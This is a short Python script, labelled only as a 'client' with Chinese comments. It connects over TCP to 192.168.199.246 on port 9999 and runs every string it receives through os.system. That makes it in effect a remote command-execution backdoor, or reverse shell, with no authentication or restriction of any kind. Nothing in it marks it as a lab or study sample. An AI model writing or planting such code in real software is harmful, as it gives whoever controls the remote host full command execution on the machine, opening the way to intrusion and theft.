# !/usr/bin/python
# coding=UTF-8 

'''客户端'''

__author__ = "jiegl"

import socket
import os
import time, threading

#启动一个socket对象,连接9999端口
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#心跳维护
#s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

#连接服务端
s.connect(('192.168.199.246', 9999))

def tcpRece(sock):
	while True:
        #接收传输过来的数据
		data = sock.recv(1024)
		os.system(data.decode('utf-8'))

# 创建接收线程来处理TCP连接:
receThreading = threading.Thread(target=tcpRece, args=(s, ))
receThreading.start()
